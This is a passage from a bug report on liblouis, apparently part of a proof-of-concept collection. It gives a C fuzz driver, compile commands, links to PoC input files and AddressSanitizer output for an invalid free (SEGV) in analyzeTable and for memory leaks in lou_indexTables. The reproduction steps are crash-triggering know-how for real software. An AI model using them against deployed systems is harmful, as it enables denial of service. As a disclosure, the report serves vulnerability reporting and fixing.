        const char *tablesArray[] = {tableList, NULL};
        lou_indexTables(tablesArray);

        return 0;
    }

    int main(int argc, char **argv) {
        if (argc < 2) {
        printf("need file input");
        return -1;
        }
        FILE *file = fopen(argv[1], "rb");
        if (file == NULL) {
            perror("fail to open file");
            return 1;
        }

        fseek(file, 0, SEEK_END);
        size_t Size = ftell(file);
        rewind(file);

        char *Data = (char *)malloc(Size + 1);
        fread(Data, 1, Size, file);
        LLVMFuzzerTestOneInput(Data, Size);
        free(Data);
        fclose(file);
    }
    ```
    The compile command is:
    ```bash
    $ clang ./driver-API-3d95765-analyzeTable-SEGV.c -o ./driver-API-3d95765-analyzeTable-SEGV -fsanitize=address,undefined -I./bin_asan/include/liblouis ./bin_asan/lib/liblouis.a -lyaml -g
    ```
3. Download the [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-3d95765-analyzeTable-SEGV) and run the compiled driver: `$ ./driver-API-3d95765-analyzeTable-SEGV ./poc-API-3d95765-analyzeTable-SEGV`

## ASAN report
```
$ ./driver-API-3d95765-analyzeTable-SEGV ./poc-API-3d95765-analyzeTable-SEGV 
AddressSanitizer:DEADLYSIGNAL
=================================================================
==1903003==ERROR: AddressSanitizer: SEGV on unknown address 0x58857284be70 (pc 0x5885727087c6 bp 0x000000000000 sp 0x7ffde43493a0 T0)
==1903003==The signal is caused by a WRITE memory access.
    #0 0x5885727087c6 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-analyzeTable-SEGV+0x467c6) (BuildId: 85e1831f4e1b08a8c13fe33c3144db8b4cad3c6c)
    #1 0x5885727a0fdf in free (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-analyzeTable-SEGV+0xdefdf) (BuildId: 85e1831f4e1b08a8c13fe33c3144db8b4cad3c6c)
    #2 0x5885727e1b59 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:842:8
    #3 0x5885727dfd79 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:901:20
    #4 0x5885727df95c in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/./driver-API-3d95765-analyzeTable-SEGV.c:21:5
    #5 0x5885727dfbd5 in main /home/yuwei/afgen/afgenllm/database/liblouis/latest/./driver-API-3d95765-analyzeTable-SEGV.c:43:5
    #6 0x781fade2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x781fade2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #8 0x5885727063c4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-analyzeTable-SEGV+0x443c4) (BuildId: 85e1831f4e1b08a8c13fe33c3144db8b4cad3c6c)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-analyzeTable-SEGV+0x467c6) (BuildId: 85e1831f4e1b08a8c13fe33c3144db8b4cad3c6c) in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType)
==1903003==ABORTING
```

# poc-API-3d95765-lou_indexTables-leak
Memory leaks in API `lou_indexTables()`

## Summary
When call API `lou_indexTables` with specific file, there will be memory leaks due to not released `tableIndex`.

https://github.com/liblouis/liblouis/blob/42af0893e7ac47761ac5ed33c04e43f541f67c46/liblouis/metadata.c#L904

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the fuzz driver, the fuzz driver code could be downloaded [here](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/driver-API-3d95765-lou_indexTables-leak.c).
    The compile command is:
    ```bash
    $ clang ./driver-API-3d95765-lou_indexTables-leak.c -o ./driver-API-3d95765-lou_indexTables-leak -fsanitize=fuzzer,address,undefined -I./liblouis ./liblouis/.libs/liblouis.a -lyaml -g
    ```
3. Download the [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-3d95765-lou_indexTables-leak) and run the compiled driver: `$ ./driver-API-3d95765-lou_indexTables-leak ./poc-API-3d95765-lou_indexTables-leak`

## ASan Report
```
$ ./driver-API-3d95765-lou_indexTables-leak ./poc-API-3d95765-lou_indexTables-leak
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2315793136
INFO: Loaded 1 modules   (2581 inline 8-bit counters): 2581 [0x56363088cee8, 0x56363088d8fd), 
INFO: Loaded 1 PC tables (2581 PCs): 2581 [0x56363088d900,0x563630897a50), 
./driver-API-3d95765-lou_indexTables-leak: Running 1 inputs 1 time(s) each.
Running: ./poc-API-3d95765-lou_indexTables-leak
warning: lou_setDataPath is deprecated.
warning: lou_setDataPath is deprecated.

=================================================================
==2758030==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 32 byte(s) in 1 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630824bc0 in list_conj /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:89:14
    #2 0x5636308295d1 in list_sort /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:136:13
    #3 0x563630824395 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:878:9
    #4 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #5 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #6 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #10 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #11 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #12 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Direct leak of 23 byte(s) in 1 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x56363082215f in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:900:20
    #2 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #3 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #4 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #5 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #8 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #9 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 160 byte(s) in 5 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630824bc0 in list_conj /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:89:14
    #2 0x5636308295d1 in list_sort /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:136:13
    #3 0x563630824395 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:878:9
    #4 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #5 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #6 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #10 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #11 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #12 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 160 byte(s) in 4 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630823d4f in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:826:11
    #2 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #3 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #4 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #5 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #9 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #10 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 40 byte(s) in 1 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630823b3c in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:808:12
    #2 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #3 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #4 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #5 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #9 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #10 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 40 byte(s) in 1 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630824047 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:851:20
    #2 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #3 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #4 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #5 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #9 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #10 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 40 byte(s) in 1 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x5636308241f1 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:866:38
    #2 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #3 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #4 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #5 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #9 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #10 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 32 byte(s) in 1 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x5636308290ae in list_dup /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:120:12
    #2 0x56363082408b in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:853:27
    #3 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #4 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #5 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 32 byte(s) in 1 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x5636308245b9 in list_conj /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:61:10
    #2 0x563630828c38 in parseLanguageTag /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:284:11
    #3 0x563630823838 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:770:21
    #4 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #5 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #6 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #10 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #11 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #12 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 32 byte(s) in 1 object(s) allocated from:
    #0 0x5636307a5de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x118de3) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x5636308245b9 in list_conj /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:61:10
    #2 0x5636308295d1 in list_sort /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:136:13
    #3 0x563630824395 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:878:9
    #4 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #5 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #6 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #10 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #11 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #12 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 30 byte(s) in 4 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630828ec3 in feat_new /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:202:10
    #2 0x563630823d7e in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:828:13
    #3 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #4 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #5 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

